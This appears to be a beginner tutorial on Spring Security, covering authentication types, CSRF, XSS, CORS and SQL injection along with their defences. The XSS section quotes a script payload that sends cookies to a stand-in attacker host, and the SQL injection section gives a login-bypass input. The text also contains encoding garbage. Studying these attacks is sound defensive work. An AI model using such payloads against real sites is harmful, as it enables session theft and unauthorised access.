Spring Security is a framework that provides a complete solution for securing Java applications.
It mainly focuses on authentication (verifying the userâ€™s identity) and authorization (controlling what resources the user can access).
Along with this, it also protects applications from common vulnerabilities like CSRF, session fixation, clickjacking, and brute-force attacks.
It will helps us to integrates easily with Spring Boot, Spring MVC, and microservices.
It works on the concept of a filter chain, intercepting every request to check whether the user is authenticated and has the right permissions.

âœ… Main Authentication Types in Spring Security
-->Form-Based Authentication
-->In-Memory Authentication â†’ Users and roles are defined in code.
-->Database (JDBC/JPA) Authentication â†’ Users fetched from a relational DB.
-->LDAP Authentication â†’ Used in enterprises with directory servers like Active Directory.
-->HTTP Basic Authentication â†’ Username/password sent in HTTP headers.
-->JWT Authentication â†’ Token-based, mostly for REST APIs & microservices.
-->OAuth2 / OpenID Connect Authentication â†’ For Single Sign-On (Google, GitHub login, etc.).

If you are using Spring Boot Starter Security, just add this in your pom.xml:

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>

Few common attacks
-----------------------
ðŸ”¹ CSRF (Cross-Site Request Forgery)
CSRF is a type of security attack where a Harmful website tricks a logged-in user into unknowingly performing unwanted actions on another application where they are authenticated.
For example, if you are logged into your bank account, an attacker could trick you into clicking a hidden link that transfers money without your consent.
This happens because the browser automatically sends stored cookies/session IDs with every request, even to Harmful crafted requests.
In Spring Security, CSRF attacks are prevented by using CSRF tokens â€” a unique, secret value added to each form or state-changing request.
When the server receives the request, it checks whether the CSRF token is valid, ensuring the request originated from the trusted application.
By default, Spring Security enables CSRF protection for web apps with forms,
but in REST APIs (stateless systems) CSRF is usually disabled and replaced with token-based authentication like JWT.
This mechanism ensures that attackers cannot forge valid requests on behalf of legitimate users.

ðŸ”¹ XSS (Cross-Site Scripting)
----------------------------------
XSS is a security vulnerability where attackers inject harmful scripts (usually JavaScript) into a trusted website.
When other users load the page, the script executes in their browser, allowing the attacker to steal cookies, session tokens, or manipulate content.
For example, a user could post a comment like <script>document.location='http://evil.com/steal?cookie='+document.cookie</script> on a blog site.
Preventing XSS involves validating and escaping user input, using frameworks that auto-escape HTML (like Thymeleaf), and applying HTTP headers like Content-Security-Policy (CSP).
Spring Security helps by adding built-in XSS filters and headers.

ðŸ”¹ CORS (Cross-Origin Resource Sharing)
---------------------------------------------
CORS is a security mechanism in browsers that restricts web pages from making requests to a different domain, port, or protocol than the one that served the web page.
For example, if your frontend runs on http://localhost:3000 and your backend API runs on http://localhost:8080, the browser will block requests unless CORS is allowed.
To enable safe cross-origin communication, the server must send specific HTTP headers like Access-Control-Allow-Origin, Access-Control-Allow-Methods, and Access-Control-Allow-Headers.
In Spring Boot, you can enable CORS globally using WebMvcConfigurer or at the controller level using @CrossOrigin.
This helps frontend apps (like React or Angular) communicate securely with backend services without violating browser policies.

SQL Injection:-
--------------------
SQL Injection is a class of vulnerability where an attacker supplies specially crafted input that gets concatenated into an application's SQL query, causing the database to execute unintended commands.
It occurs when user input is used directly in SQL statements without proper handling, letting the attacker modify query logic (e.g., bypass authentication, exfiltrate or destroy data).
A classic example is sending username: ' OR '1'='1 to a login query so it always returns true.
Consequences include data theft, data corruption, privilege escalation, and full system compromise depending on DB permissions.
SQL injection is prevented primarily by never building SQL with string concatenation â€” instead use parameterized queries / prepared statements or ORM parameter binding.
Additional protections: input validation, least-privilege DB accounts, stored procedures (used correctly), escaping when necessary, and runtime defenses like WAFs and query-logging/monitoring.
Always assume input is hostile and design DB access layers accordingly.
